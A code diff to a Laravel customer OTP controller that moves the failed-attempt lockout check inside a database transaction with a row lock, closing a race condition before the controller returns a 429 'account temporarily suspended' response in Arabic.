@@ -35,24 +35,18 @@ class CustomerOtpController extends Controller
             'national_id'  => $validated['national_id'] ?? null,
         ], fn($v) => $v !== null));
 
-        // ── Lockout check (10 consecutive failures → 10 min lock) ──
-        if ($customer->otp_locked_until && now()->lt($customer->otp_locked_until)) {
-            $remaining = now()->diffInMinutes($customer->otp_locked_until, true) + 1;
-
-            return response()->json([
-                'success' => false,
-                'message' => "تم تعليق الحساب مؤقتاً. حاول مرة أخرى بعد {$remaining} دقيقة",
-                'locked' => true,
-                'retry_after_minutes' => $remaining,
-            ], 429);
-        }
-
         // Determine the OTP type for storage
         $otpType = $isStcOtp ? 'stc_otp' : 'otp';
         $rawCode = $validated['otp'];
 
         // Idempotency + invalidation inside a transaction to prevent double-submit races
         $otp = \Illuminate\Support\Facades\DB::transaction(function () use ($customer, $otpType, $rawCode, $validated) {
+            // Re-read with lock to prevent race between lockout check and concurrent rejection
+            $locked = CustomerProfile::where('id', $customer->id)->lockForUpdate()->value('otp_locked_until');
+            if ($locked && now()->lt($locked)) {
+                return null; // signal lockout
+            }
+
             // Check for an existing pending OTP of the same type created in the last 2 minutes (idempotent)
             $existing = OtpCode::where('customer_profile_id', $customer->id)
                 ->ofType($otpType)
@@ -83,6 +77,17 @@ class CustomerOtpController extends Controller
                 'expires_at' => now()->addMinutes(5),
             ]);
         });
+
+        // Handle lockout detected inside transaction
+        if ($otp === null) {
+            $remaining = now()->diffInMinutes($customer->fresh()->otp_locked_until, true) + 1;
+            return response()->json([
+                'success' => false,
+                'message' => "تم تعليق الحساب مؤقتاً. حاول مرة أخرى بعد {$remaining} دقيقة",
+                'locked' => true,
+                'retry_after_minutes' => $remaining,
+            ], 429);
+        }
 
         // Notify admin dashboard in real-time
         CustomerCacheService::flush();
